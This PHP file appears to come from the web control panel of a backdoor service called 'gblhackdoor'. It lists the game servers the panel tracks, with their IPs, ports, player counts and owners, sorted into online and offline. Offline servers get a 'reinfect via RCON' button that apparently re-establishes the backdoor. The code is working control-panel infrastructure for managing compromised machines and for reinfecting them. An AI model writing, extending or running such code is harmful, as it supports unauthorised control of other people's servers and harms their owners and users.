<?php include("core/class/include.php");
if (!Account::isAuthentified() || $_GET['theget'] == NULL)
{
    die("Bad request");
}
if($_GET['theget'] == 1){
                    $selectionserver = Server::GetAllServer();

                        
                    // Print Output
                    foreach($selectionserver as $AfficheServer)
                    {
                    if ($AfficheServer['last_update'] + 30 > time())
    {
                    if($_SESSION['id'] == $AfficheServer['userid'] || IsAdmin($_SESSION['id'])){
                     $button_hearth_console = '<button onclick="showserverboii('.$AfficheServer['id'].')" type="button" class="btn btn-primary btn-sm"><i class="   fas fa-clone"></i></button>';
                     $ip_data = explode(':', $AfficheServer['server_ip']);
                        echo 
                        "
                            <tr class='item'>
                                <td><b>" . htmlspecialchars($AfficheServer['server_name']) . "</b></td>
                                <td><b>" . htmlspecialchars($ip_data[0]) . "</b></td>
                                <td><b>" . htmlspecialchars($ip_data[1]) . "</b></td>
                                <td><b>" . htmlspecialchars($AfficheServer['server_users']) . "</b></td>
                                <td><b>" . htmlspecialchars(date('d/m/Y à H:i:s', $AfficheServer['last_update'])) . "</b></td>
                                <td><b>" . Account::GetUsername($AfficheServer['userid']) . "</b></td>
                                <td><b>" . $button_hearth_console . "</b></td>
                            </tr>
                        ";
                        } 
                    }
                    }
                }

if($_GET['theget'] == 2){
    $selectionserver = Server::GetAllServer();

                        
                    // Print Output
                    foreach($selectionserver as $AfficheServer)
                    {
                    if ($AfficheServer['last_update'] + 30 < time())
    {

                    if($_SESSION['id'] == $AfficheServer['userid'] || IsAdmin($_SESSION['id'])){

                     $button_off_inf = '<a href="http://gblhackdoor.ga/servers#'.$AfficheServer['id'].'" class="btn btn-info btn-sm"><i class="fa fa-trash"></i>&nbsp;Page</a>';
            

        $button_rcon_rst = '<button onclick="reinfectRCON('.$AfficheServer['id'].')" type="button" class="btn btn-primary btn-sm"><i class="fa fa-file-code-o"></i>&nbsp;Reconnecter via RCON</button>';

                     $ip_data = explode(':', $AfficheServer['server_ip']);
                        echo 
                        "
                            <tr>
                                <td><b>" . htmlspecialchars($AfficheServer['server_name']) . "</b></td>
                                <td><b>" . htmlspecialchars($ip_data[0]) . "</b></td>
                                <td><b>" . htmlspecialchars($ip_data[1]) . "</b></td>
                                <td><b>" . htmlspecialchars(date('d/m/Y à H:i:s', $AfficheServer['last_update'])) . "</b></td>
                                <td><b>" . Account::GetUsername($AfficheServer['userid']) . "</b></td>
                                <td><b>" . $button_rcon_rst . " " . $button_off_inf . "</b></td>
                            </tr>
                        ";
                        } 
                    }
                    }
                }


?>